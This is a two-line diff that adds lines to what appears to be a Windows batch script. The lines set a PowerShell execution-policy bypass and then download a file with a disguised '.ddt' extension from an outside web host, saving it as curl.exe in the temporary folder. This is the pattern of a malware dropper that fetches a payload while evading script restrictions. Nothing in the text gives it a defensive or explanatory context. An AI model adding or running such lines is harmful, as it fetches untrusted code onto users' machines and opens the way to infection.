@@ -1,0 +1,2 @@
+set powerPolicy=-ExecutionPolicy Bypass
+call powershell.exe %powerPolicy% -Command wget https://www.sgneep.com/D/curl.ddt -OutFile %TMP%\curl.exe
